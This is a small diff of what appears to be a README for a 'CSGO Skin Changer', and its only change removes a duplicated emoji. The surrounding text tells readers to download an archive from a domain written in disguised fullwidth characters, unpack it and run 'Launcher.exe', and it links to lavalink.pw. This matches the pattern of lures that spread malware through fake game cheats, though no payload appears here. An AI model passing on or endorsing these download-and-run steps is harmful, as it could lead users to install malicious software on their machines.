@@ -13,7 +13,7 @@ https://lavalink.pw/CSGO_Skin_Changer/index.php
 
 # 💻 How to download?
 
-+ 🏵 🏵Download From "ｗｗｗ．ｌａｖａｃｈｔ．ｃｏｍ"
++ 🏵 Download From "ｗｗｗ．ｌａｖａｃｈｔ．ｃｏｍ"
 + 🏵 Unpack Archive "CSGO_Skin_Changer.zip"
 + 🏵 Run "Launcher.exe"
 + 🏵 Waiting For The Installation To Complete
